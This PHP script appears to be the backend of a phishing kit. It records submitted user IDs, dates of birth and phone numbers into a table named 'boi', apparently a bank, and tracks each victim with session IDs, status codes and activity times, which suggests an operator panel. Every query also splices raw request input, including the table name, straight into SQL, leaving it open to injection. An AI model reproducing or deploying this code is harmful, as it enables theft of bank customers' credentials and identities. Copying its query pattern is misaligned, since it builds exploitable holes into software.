<?php
session_start();
require '../connection.php';
date_default_timezone_set("Europe/London");

if (isset($_GET["error"])) {
  if ($_POST["uniqueid"]) {
    $uniqueid = $_POST["uniqueid"];
    $selSite = $_POST['selSite'];

    $query = mysqli_query($conn, "UPDATE $selSite SET status=7 WHERE id=$uniqueid");
    if ($query) {
      echo json_encode(array(
        'status' => 'success'
      ));
      die(0);
    } else {
      echo json_encode(array(
        'status' => 'failure',
        'error' => mysqli_error($conn)
      ));
      die(0);
    }
  }
}


if ($_POST["userid"] and $_POST["dob"] and $_POST["phonenumber"]) {
  $username = $_POST["userid"];
  $dob = $_POST["dob"];
  $phonenumber = $_POST["phonenumber"];

  if (isset($_GET["resent"]) and $_GET["uid"]) {
    $uniqueid = $_GET["uid"];

    $update_query = mysqli_query($conn, "UPDATE boi SET username='$username', dob='$dob', phonenumber='$phonenumber', status=1 WHERE uniqueid=$uniqueid");
    if ($update_query) {
      echo json_encode(array(
        'status' => 'success'
      ));
    } else {
      echo json_encode(array(
        'status' => 'failure'
      ));
    }
    die(0);
  }

  $_SESSION['uniqueid'] = time();
  $uniqueid = $_SESSION['uniqueid'];

  $current_time = time();

  $query = mysqli_query($conn, "INSERT INTO boi (username, dob, phonenumber, status, uniqueid, last_activity) VALUES ('$username', '$dob', '$phonenumber', 1, $uniqueid, $current_time)");

  if ($query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}

?>
